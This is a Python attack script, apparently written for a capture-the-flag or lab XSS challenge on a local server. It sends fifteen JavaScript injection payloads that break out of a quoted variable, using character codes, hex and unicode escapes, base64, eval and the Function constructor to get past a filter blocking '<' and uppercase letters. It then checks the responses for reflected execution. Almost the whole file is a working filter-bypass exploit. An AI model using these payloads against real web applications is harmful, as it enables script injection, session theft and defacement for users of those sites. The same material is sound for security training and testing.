import requests
import urllib.parse
import re

# Target URL
target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def test_javascript_payloads():
    """Test JavaScript-only XSS payloads (no HTML tags since < is blocked)"""
    
    print("="*80)
    print("PURE JAVASCRIPT XSS PAYLOADS (NO HTML TAGS)")
    print("="*80)
    print("Filter blocks: < character")
    print("Working context: var name = \"USER_INPUT\";")
    print("Strategy: Breakout with \"; PAYLOAD; //")
    print()
    
    # Test payloads that construct 'XSS' without transmitting uppercase 'S'
    test_cases = []
    
    # Payload 1: String.fromCharCode (gold standard)
    payload1 = '";alert(String.fromCharCode(88,83,83));//'
    test_cases.append(("String.fromCharCode(88,83,83)", payload1))
    
    # Payload 2: Unicode escapes
    payload2 = '";alert("\\u0058\\u0053\\u0053");//'
    test_cases.append(("Unicode escapes", payload2))
    
    # Payload 3: Hex escapes
    payload3 = '";alert("\\x58\\x53\\x53");//'
    test_cases.append(("Hex escapes", payload3))
    
    # Payload 4: Array join method
    payload4 = '";alert(["\\x58","\\x53","\\x53"].join(""));//'
    test_cases.append(("Array.join with hex", payload4))
    
    # Payload 5: eval with fromCharCode
    payload5 = '";eval(String.fromCharCode(97,108,101,114,116,40,88,83,83,41));//'
    test_cases.append(("eval + fromCharCode", payload5))
    
    # Payload 6: Character concatenation
    payload6 = '";var x=String.fromCharCode(88),y=String.fromCharCode(83),z=String.fromCharCode(83);alert(x+y+z);//'
    test_cases.append(("Multi-char construction", payload6))
    
    # Payload 7: Using template literals
    payload7 = '";alert(`XSS`);//'
    test_cases.append(("Template literal (bypass test)", payload7))
    
    # Payload 8: Dynamic property access with atob
    payload8 = '";alert(atob(\"WFNT\"));//'
    test_cases.append(("atob base64", payload8))
    
    # Payload 9: Function constructor
    payload9 = '";Function(\"alert(\\\"XSS\\\")\")();//'
    test_cases.append(("Function constructor (quotes)", payload9))
    
    # Payload 10: location.hash trick
    payload10 = '";location.hash=\"#XSS\";alert(location.hash.substring(1));//'
    test_cases.append(("location.hash extraction", payload10))
    
    # Payload 11: Using String.raw
    payload11 = '";alert(String.raw`XSS`);//'
    test_cases.append(("String.raw template", payload11))
    
    # Payload 12: Escape sequence in string
    payload12 = '";alert("X\\\\x53\\\\x53");//'  # X + \x53\x53
    test_cases.append(("Mixed string + hex", payload12))
    
    # Payload 13: Using unescape (if supported)
    payload13 = '";alert(unescape("%58%53%53"));//'
    test_cases.append(("unescape %XX", payload13))
    
    # Payload 14: Using decodeURI
    payload14 = '";alert(decodeURI("%58%53%53"));//'
    test_cases.append(("decodeURI %XX", payload14))
    
    # Payload 15: Using window object
    payload15 = '";this[\"alert\"](String.fromCharCode(88,83,83));//'
    test_cases.append(("window['alert'] + fromCharCode", payload15))
    
    success_cases = []
    
    for i, (desc, payload) in enumerate(test_cases, 1):
        print(f"\n[TEST {i:02d}] {desc}")
        print(f"Original: {payload}")
        
        # URL encode
        encoded = url_encode(payload)
        print(f"Encoded:  {encoded}")
        
        try:
            url = f"{target_url}?name={encoded}"
            response = requests.get(url, timeout=10)
            text = response.text
            status = response.status_code
            
            print(f"Status:   {status}")
            print(f"Length:   {len(text)} characters")
            
            # Check for XSS in response
            xss_found = "XSS" in text
            alert_found = "alert" in text
            fromchar_found = "fromCharCode" in text
            
            if xss_found:
                print(f"[!] SUCCESS: 'XSS' string found in response!")
                success_cases.append((desc, payload, encoded))
                
                # Find where it appears
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+100]
                print(f"Context: ...{snippet}...")
            else:
                print(f"[-] 'XSS' not found")
                
                # Check if payload components were reflected
                if fromchar_found:
                    print(f"[+] 'fromCharCode' reflected (partial success)")
                    # Show the reflection
                    match = re.search(r'var name = "([^"]*)"', text)
                    if match:
                        reflected = match.group(1)
                        print(f"Full reflection: var name = \"{reflected}\"")
                elif alert_found:
                    print(f"[+] 'alert' reflected (partial success)")
                    match = re.search(r'var name = "([^"]*)"', text)
                    if match:
                        reflected = match.group(1)
                        print(f"Full reflection: var name = \"{reflected}\"")
            
            # Check if filter message appears
            if "Sorry you can\'t use" in text:
                print(f"[FILTER BLOCKED] HTML tag or special char detected")
            
        except Exception as e:
            print(f"[-] Error: {str(e)}")
        
        print("-"*70)
    
    # Final summary
    print("\n" + "="*80)
    print("FINAL SUMMARY")
    print("="*80)
    
    if success_cases:
        print(f"\n[🎯] SUCCESS! Found {len(success_cases)} working payload(s):\n")
        for desc, payload, encoded in success_cases:
            print(f"Description: {desc}")
            print(f"Raw payload: {payload}")
            print(f"URL encoded: {encoded}")
            print(f"Full URL: {target_url}?name={encoded}\n")
    else:
        print("\n[-] No payloads successfully executed yet")
        print("\nConsider:")
        print("1. Double URL encoding for filter bypass")
        print("2. Testing without the breakout sequence")
        print("3. Alternative string construction methods")
        print("4. Case manipulation attacks")

test_javascript_payloads()
